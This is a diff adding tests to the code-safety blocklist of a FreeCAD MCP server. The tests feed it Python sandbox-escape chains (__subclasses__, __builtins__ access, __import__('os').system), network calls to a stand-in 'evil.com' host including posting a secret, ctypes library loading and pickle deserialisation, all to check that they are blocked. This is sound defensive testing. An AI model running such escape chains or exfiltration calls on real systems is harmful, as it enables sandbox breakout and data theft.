@@ -18,6 +18,7 @@ from freecad_mcp.guidelines import (  # noqa: E402
     check_code_conflict,
     check_path_conflict,
     check_prompt_conflict,
+    scan_dangerous_tokens,
 )
 
 # ---------------------------------------------------------------------------
@@ -91,6 +92,160 @@ def test_code_eval_blocked():
 
 def test_code_exec_blocked():
     assert check_code_conflict("exec(code)")[0] is True
+
+
+# v0.4.0 — extended blocklist -----------------------------------------
+
+def test_code_compile_blocked():
+    assert check_code_conflict("compile(src, '<s>', 'exec')")[0] is True
+
+
+def test_code_breakpoint_blocked():
+    assert check_code_conflict("breakpoint()")[0] is True
+
+
+def test_code_dunder_import_blocked():
+    assert check_code_conflict("__import__('os').system('reboot')")[0] is True
+
+
+def test_code_dunder_import_with_spaces_blocked():
+    assert check_code_conflict("__import__ ( 'os' )")[0] is True
+
+
+def test_code_globals_call_blocked():
+    """`globals()` returns the current module's globals — used in
+    sandbox-escape chains. Block it.
+    """
+    assert check_code_conflict("g = globals()")[0] is True
+
+
+def test_code_locals_call_blocked():
+    assert check_code_conflict("l = locals()")[0] is True
+
+
+def test_code_getattr_builtins_blocked():
+    assert check_code_conflict("getattr(__builtins__, 'eval')('1+1')")[0] is True
+
+
+def test_code_builtins_dict_access_blocked():
+    """v0.4.0: direct ``__builtins__.__dict__['eval']`` bypasses
+    the getattr-based check. Caught now.
+    """
+    assert check_code_conflict("__builtins__.__dict__['eval']('1+1')")[0] is True
+    assert check_code_conflict("__builtins__.__getattribute__('eval')('1+1')")[0] is True
+
+
+def test_code_sandbox_subclasses_escape_blocked():
+    """v0.4.0: the canonical Python sandbox escape. Defended in depth."""
+    assert check_code_conflict("().__class__.__bases__[0].__subclasses__()")[0] is True
+    assert check_code_conflict("().__class__.__mro__[1].__subclasses__()")[0] is True
+    assert check_code_conflict("().__class__.__subclasses__()")[0] is True
+
+
+def test_code_introspection_helpers_blocked():
+    """``vars()`` / ``dir()`` expose the local/global namespace \u2014 rarely
+    legitimate in CAD scripts, common in sandbox-escape prep.
+    """
+    assert check_code_conflict("vars()")[0] is True
+    assert check_code_conflict("dir()")[0] is True
+
+
+def test_code_socket_blocked():
+    assert check_code_conflict("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")[0] is True
+    assert check_code_conflict("socket.create_connection(('evil.com', 80))")[0] is True
+
+
+def test_code_urllib_blocked():
+    assert check_code_conflict("urllib.request.urlopen('http://evil')")[0] is True
+    assert check_code_conflict("urllib.urlretrieve('http://evil', '/tmp/x')")[0] is True
+
+
+def test_code_requests_blocked():
+    assert check_code_conflict("requests.get('http://evil')")[0] is True
+    assert check_code_conflict("requests.post(url, data=secret)")[0] is True
+
+
+def test_code_httpx_blocked():
+    assert check_code_conflict("httpx.get('http://evil')")[0] is True
+
+
+def test_code_ftplib_blocked():
+    assert check_code_conflict("ftplib.FTP('evil.com')")[0] is True
+
+
+def test_code_smtplib_blocked():
+    assert check_code_conflict("smtplib.SMTP('evil.com', 25)")[0] is True
+
+
+def test_code_network_imports_blocked():
+    for imp in (
+        "import socket",
+        "import urllib",
+        "import requests",
+        "import httpx",
+        "import ftplib",
+        "import smtplib",
+        "from socket import socket",
+        "from urllib.request import urlopen",
+    ):
+        assert check_code_conflict(imp)[0] is True, imp
+
+
+def test_code_ctypes_blocked():
+    assert check_code_conflict("libc = ctypes.CDLL('libc.so.6')")[0] is True
+    assert check_code_conflict("libc = ctypes.WinDLL('kernel32')")[0] is True
+    assert check_code_conflict("libc = ctypes.cdll.LoadLibrary('libc.so.6')")[0] is True
+
+
+def test_code_ctypes_imports_blocked():
+    assert check_code_conflict("import ctypes")[0] is True
+    assert check_code_conflict("from ctypes import CDLL")[0] is True
+
+
+def test_code_cffi_import_blocked():
+    assert check_code_conflict("import cffi")[0] is True
+
+
+def test_code_pickle_blocked():
+    assert check_code_conflict("pickle.load(open('x.pkl', 'rb'))")[0] is True
+    assert check_code_conflict("pickle.loads(data)")[0] is True
+    assert check_code_conflict("pickle.dumps(obj)")[0] is True
+
+
+def test_code_marshal_blocked():
+    assert check_code_conflict("marshal.load(open('x.mar', 'rb'))")[0] is True
+    assert check_code_conflict("marshal.loads(data)")[0] is True
+
+
+def test_code_shelve_blocked():
+    assert check_code_conflict("shelve.open('x.shelve')")[0] is True
+
+
+def test_code_serialization_imports_blocked():
+    for imp in ("import pickle", "import marshal", "import shelve"):
+        assert check_code_conflict(imp)[0] is True, imp
+
+
+def test_scan_dangerous_tokens_returns_all_matches():
+    """scan_dangerous_tokens returns every matching pattern, not just the first."""
+    payload = "import os, socket, pickle; os.system('x'); socket.socket(); pickle.load(f)"
+    matches = scan_dangerous_tokens(payload)
+    patterns = [p.pattern for p in matches]
+    # Should have caught: os.system, socket, pickle.load, and the imports.
+    assert any("system" in p for p in patterns)
+    assert any("socket" in p for p in patterns)
+    assert any("pickle" in p for p in patterns)
+    assert len(matches) >= 3
+
+
+def test_scan_dangerous_tokens_empty():
+    assert scan_dangerous_tokens("") == []
+
+
+def test_scan_dangerous_tokens_clean_code():
+    """A clean snippet should match nothing."""
+    clean = "box = doc.addObject('Part::Box', 'B'); box.Length = 10"
+    assert scan_dangerous_tokens(clean) == []
 
 
 # False-positive regression suite ----------------------------------------
@@ -281,6 +436,33 @@ if __name__ == "__main__":
     test_code_reboot_blocked()
     test_code_eval_blocked()
     test_code_exec_blocked()
+    test_code_compile_blocked()
+    test_code_breakpoint_blocked()
+    test_code_dunder_import_blocked()
+    test_code_dunder_import_with_spaces_blocked()
+    test_code_globals_call_blocked()
+    test_code_locals_call_blocked()
+    test_code_getattr_builtins_blocked()
+    test_code_builtins_dict_access_blocked()
+    test_code_sandbox_subclasses_escape_blocked()
+    test_code_introspection_helpers_blocked()
+    test_code_socket_blocked()
+    test_code_urllib_blocked()
+    test_code_requests_blocked()
+    test_code_httpx_blocked()
+    test_code_ftplib_blocked()
+    test_code_smtplib_blocked()
+    test_code_network_imports_blocked()
+    test_code_ctypes_blocked()
+    test_code_ctypes_imports_blocked()
+    test_code_cffi_import_blocked()
+    test_code_pickle_blocked()
+    test_code_marshal_blocked()
+    test_code_shelve_blocked()
+    test_code_serialization_imports_blocked()
+    test_scan_dangerous_tokens_returns_all_matches()
+    test_scan_dangerous_tokens_empty()
+    test_scan_dangerous_tokens_clean_code()
     test_code_evaluate_word_safe()
     test_code_exec_word_safe()
     test_code_subprocess_word_safe()
